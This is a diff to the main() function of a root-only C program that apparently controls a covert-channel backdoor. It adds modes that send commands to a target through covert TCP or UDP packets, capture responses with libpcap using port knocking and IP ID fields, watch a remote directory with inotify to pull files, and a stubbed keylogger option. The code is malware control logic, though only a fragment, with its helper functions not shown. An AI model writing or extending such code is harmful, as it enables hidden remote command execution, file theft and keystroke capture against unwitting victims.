@@ -41,7 +41,8 @@ int main(int argc, char **argv){
     char file[BUFSIZ];
     char directory[BUFSIZ];
     struct filter Filter;
-    bool tcp = false;
+    bool tcp = false, if_command = false, if_directory = false, if_file = false, if_keylogger = false;
+
     /* make sure user has root privilege */
     if(geteuid() != 0) {
         printf("Must run as root\n");
@@ -80,35 +81,74 @@ int main(int argc, char **argv){
             case 5:
                 strncpy(directory, optarg, BUFSIZ);
                 printf("Directory: %s\n", directory);
+                if_directory = true;
                 break;
             case 6:
                 strncpy(file, optarg, BUFSIZ);
                 printf("File: %s\n", file);
+                if_file = true;
                 break;
             default: /*  '?' */
                 print_usage();
                 exit(1);
         }
     }
-    inotify_struct *inotify_args = malloc(sizeof(*inotify_args));
-    strncpy(inotify_args->file, file, BUFSIZ);
-    strncpy(inotify_args->targetip, targetip, BUFSIZ);
-    strncpy(inotify_args->localip, localip, BUFSIZ);
-    strncpy(inotify_args->directory, directory, BUFSIZ);
-    inotify_args->tcp = tcp;
-    pthread_create(&inotify_thread, NULL, recv_watch_directory,inotify_args);
 
 
-    Filter = InitFilter(targetip,localip,false);
-    CreateFilter(Filter, pcapfilter,tcp);
-    printf("Filter: %s\n",pcapfilter);
-	if(tcp){
-        covert_send(localip, targetip, Filter.port_short[0], Filter.port_short[0], data, 0);
-    } else {
-        covert_udp_send_data(Filter.localip, Filter.targetip, UPORT, UPORT, data, 1);
+    //add command into buffer
+    //send buffer (tcp or udp)
+
+    //create filter (tcp/udp, command, ip, port)
+    //libpcap (tcp/udp, command)
+        //wait packets
+            //parse ip
+            //check port (tcp/udp)
+            //if correct port
+                //check key
+                    //print ip.id to results
+            //else
+                //drop packet
+
+    //return;
+
+
+
+
+
+
+    //validate inotify directory and file
+    if((if_directory && !if_file) || (!if_directory && if_file)) {
+        perror("inotify requires both --directory and --file");
+        print_usage();
+        return 0;
     }
-	//wait for port knocking
-	Packetcapture(pcapfilter,Filter,tcp);
-	pthread_join(inotify_thread, NULL);
+
+    if(if_command) {
+        Filter = InitFilter(targetip,localip,false);
+        CreateFilter(Filter, pcapfilter,tcp);
+        printf("Filter: %s\n",pcapfilter);
+        if(tcp){
+            covert_send(localip, targetip, Filter.port_short[0], Filter.port_short[0], data, 0);
+        } else {
+            covert_udp_send_data(Filter.localip, Filter.targetip, UPORT, UPORT, data, 1);
+        }
+
+        Packetcapture(pcapfilter,Filter,tcp);
+
+    } else if(if_directory && if_file) {    //INOTIFY
+        inotify_struct *inotify_args = malloc(sizeof(*inotify_args));
+        strncpy(inotify_args->file, file, BUFSIZ);
+        strncpy(inotify_args->targetip, targetip, BUFSIZ);
+        strncpy(inotify_args->localip, localip, BUFSIZ);
+        strncpy(inotify_args->directory, directory, BUFSIZ);
+        inotify_args->tcp = tcp;
+        pthread_create(&inotify_thread, NULL, recv_watch_directory,inotify_args);
+        pthread_join(inotify_thread, NULL);
+
+    } else if(if_keylogger) {
+
+    }
+
+
     return 0;
 }
